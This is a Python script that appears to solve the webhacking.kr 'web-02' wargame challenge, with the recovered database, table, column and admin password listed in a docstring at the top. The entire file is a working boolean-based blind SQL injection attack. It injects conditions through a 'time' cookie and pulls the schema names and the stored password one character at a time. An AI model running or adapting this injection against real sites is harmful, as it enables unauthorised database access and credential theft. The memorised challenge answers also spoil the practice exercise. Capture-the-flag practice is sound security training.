import requests
import string

"""
database_length = 6
database_name = "chall2"
table_length = 13
table_name = "admin_area_pw"
column_length = 2
column_name = "pw"
password_length = 17
password = "kudos_to_beistlab"
"""

database_length = 0
# Check length of database name
for i in range(1, 20):
	my_cookies = dict(time='LENGTH((SELECT DATABASE())) = {}'.format(i))
	r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
	if "2070-01-01 09:00:01" in r.content:
		print("Length of database name is {}".format(i))
		database_length = i
		break

database_name = ""
# Get database name
for i in range(1, database_length + 1):
	for ch in string.ascii_lowercase + string.digits:
		my_cookies = dict(time='SUBSTR((SELECT DATABASE()), {}, 1) = "{}"'.format(i, ch))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
		if "2070-01-01 09:00:01" in r.content:
			database_name += ch
			print("Database Name: {}".format(database_name))
			break
print("Final Database Name: {}".format(database_name))

table_length = 0
# Check length of table name
for i in range(1, 20):
	my_cookies = dict(time='LENGTH((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="{}" LIMIT 0,1)) = {}'.format(database_name, i))
	r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
	if "2070-01-01 09:00:01" in r.content:
		print("Length of table name is {}".format(i))
		table_length = i
		break

table_name = ""
# Get table name
for i in range(1, table_length + 1):
	for ch in string.ascii_lowercase + string.digits + "_":
		my_cookies = dict(time='SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="{}" LIMIT 0,1), {}, 1) = "{}"'.format(database_name, i, ch))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
		if "2070-01-01 09:00:01" in r.content:
			table_name += ch
			print("Table Name: {}".format(table_name))
			break
print("Final Table Name: {}".format(table_name))

column_length = 0
# Check length of column name
for i in range(1, 20):
	my_cookies = dict(time='LENGTH((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="{}" LIMIT 0,1)) = {}'.format(table_name, i))
	r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
	if "2070-01-01 09:00:01" in r.content:
		print("Length of column name is {}".format(i))
		column_length = i
		break

column_name = ""
# Get column name
for i in range(1, column_length + 1):
	for ch in string.ascii_lowercase + string.digits + "_":
		my_cookies = dict(time='SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="{}" LIMIT 0,1), {}, 1) = "{}"'.format(table_name, i, ch))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
		if "2070-01-01 09:00:01" in r.content:
			column_name += ch
			print("Column Name: {}".format(column_name))
			break
print("Final Column Name: {}".format(column_name))

password_length = 0
# Check length of password
for i in range(1, 20):
	my_cookies = dict(time='LENGTH((SELECT {} FROM {} LIMIT 0,1)) = {}'.format(column_name, table_name, i))
	r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
	if "2070-01-01 09:00:01" in r.content:
		print("Length of password is {}".format(i))
		password_length = i
		break

password = ""
# Get password
for i in range(1, password_length + 1):
	for ch in string.ascii_lowercase + string.digits + "_":
		my_cookies = dict(time='SUBSTR((SELECT {} FROM {} LIMIT 0,1), {}, 1) = "{}"'.format(column_name, table_name, i, ch))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
		if "2070-01-01 09:00:01" in r.content:
			password += ch
			print("Password: {}".format(password))
			break
print("Final Passowrd: {}".format(password))